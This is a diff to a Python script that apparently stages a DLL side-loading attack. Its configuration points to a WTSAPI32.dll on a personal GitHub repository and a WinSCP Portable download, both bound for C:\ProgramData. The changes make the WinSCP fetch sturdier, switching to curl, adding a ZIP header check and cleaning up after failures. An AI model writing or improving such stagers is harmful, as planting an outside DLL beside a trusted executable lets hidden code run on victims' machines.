@@ -8,7 +8,7 @@ import zipfile
 # CONFIGURATION
 # ===============================================
 dll_url    = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/dll/WTSAPI32.dll"
-app_url    = "https://winscp.net/download/WinSCP-6.5.5-Portable.zip"
+app_url    = "https://downloads.sourceforge.net/project/winscp/WinSCP/6.5.5/WinSCP-6.5.5-Portable.zip"
 stage_dir  = r"C:\ProgramData"
 app_zip    = os.path.join(stage_dir, "winscp.zip")
 app_dir    = os.path.join(stage_dir, "WinSCP")
@@ -25,13 +25,25 @@ if os.path.exists(app_exe):
         f.write(f"[SKIP] WinSCP already staged at {app_exe}\n")
 else:
     try:
-        urllib.request.urlretrieve(app_url, app_zip)
+        os.makedirs(app_dir, exist_ok=True)
+        # Use curl to follow redirects and download the actual file
+        subprocess.run(
+            ['curl.exe', '-L', '-o', app_zip, app_url],
+            check=True, capture_output=True
+        )
+        
+        # Simple ZIP header check (PK\x03\x04)
+        with open(app_zip, 'rb') as f:
+            if f.read(4) != b'PK\x03\x04':
+                raise Exception("Downloaded file is not a valid ZIP (Check URL/Network)")
+
         with zipfile.ZipFile(app_zip, 'r') as z:
             z.extractall(app_dir)
         os.remove(app_zip)
         with open(log_path, 'a') as f:
             f.write(f"[OK] WinSCP staged to {app_dir}\n")
     except Exception as e:
+        if os.path.exists(app_zip): os.remove(app_zip)
         with open(log_path, 'a') as f:
             f.write(f"[ERR] WinSCP download failed: {e}\n")
 
